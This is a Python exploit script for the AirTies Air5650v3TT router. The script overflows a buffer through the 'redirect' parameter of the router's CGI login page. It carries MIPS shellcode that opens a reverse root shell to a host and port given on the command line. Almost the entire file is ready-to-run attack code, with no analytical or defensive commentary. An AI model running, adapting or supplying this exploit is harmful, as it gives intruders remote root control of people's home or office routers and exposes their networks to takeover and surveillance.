#!/usr/bin/env python
#####################################################################################
# Exploit for the AIRTIES Air5650v3TT
# Spawns a reverse root shell
# Author: Batuhan Burakcin
# Contact: batuhan@bmicrosystems.com
# Twitter: @batuhanburakcin
# Web: http://www.bmicrosystems.com
#####################################################################################
 
import sys
import time
import string
import socket, struct
import urllib, urllib2, httplib
 
 
 
 
 
if __name__ == '__main__':
     
 
 
 
    try:
        ip = sys.argv[1]
        revhost = sys.argv[2]
        revport = sys.argv[3]
    except:
        print "Usage: %s <target ip> <reverse shell ip> <reverse shell port>" % sys.argv[0]
 
    host = struct.unpack('>L',socket.inet_aton(revhost))[0] 
    port = string.atoi(revport)
 
 
    shellcode = ""
    shellcode += "\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21\xe5\xff\xfd"
    shellcode += "\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff"
    shellcode += "\x8f\xa4\xff\xff\x34\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0"
    shellcode += "\x3c\x0e" + struct.unpack('>cc',struct.pack('>H', port))[0] + struct.unpack('>cc',struct.pack('>H', port))[1]
    shellcode += "\x35\xce" + struct.unpack('>cc',struct.pack('>H', port))[0] + struct.unpack('>cc',struct.pack('>H', port))[1]
    shellcode += "\xaf\xae\xff\xe4"
    shellcode += "\x3c\x0e" + struct.unpack('>cccc',struct.pack('>I', host))[0] + struct.unpack('>cccc',struct.pack('>I', host))[1]
    shellcode += "\x35\xce" + struct.unpack('>cccc',struct.pack('>I', host))[2] + struct.unpack('>cccc',struct.pack('>I', host))[3]
    shellcode += "\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27"
    shellcode += "\x24\x02\x10\x4a\x01\x01\x01\x0c\x24\x11\xff\xfd\x02\x20\x88\x27"
    shellcode += "\x8f\xa4\xff\xff\x02\x20\x28\x21\x24\x02\x0f\xdf\x01\x01\x01\x0c"
    shellcode += "\x24\x10\xff\xff\x22\x31\xff\xff\x16\x30\xff\xfa\x28\x06\xff\xff"
    shellcode += "\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f"
    shellcode += "\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec"
    shellcode += "\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab"
    shellcode += "\x01\x01\x01\x0c"
 
 
    data = "\x41"*359 + "\x2A\xB1\x19\x18" + "\x41"*40 + "\x2A\xB1\x44\x40"
    data += "\x41"*12 + "\x2A\xB0\xFC\xD4" + "\x41"*16 + "\x2A\xB0\x7A\x2C"
    data += "\x41"*28 + "\x2A\xB0\x30\xDC" + "\x41"*240 + shellcode + "\x27\xE0\xFF\xFF"*48
 
    pdata = {
        'redirect'      : data,
        'self'          : '1',
        'user'          : 'tanri',
        'password'      : 'ihtiyacmyok',
        'gonder'        : 'TAMAM'
        }
 
    login_data = urllib.urlencode(pdata)
    #print login_data
 
    url = 'http://%s/cgi-bin/login' % ip
    header = {}
    req = urllib2.Request(url, login_data, header)
    rsp = urllib2.urlopen(req)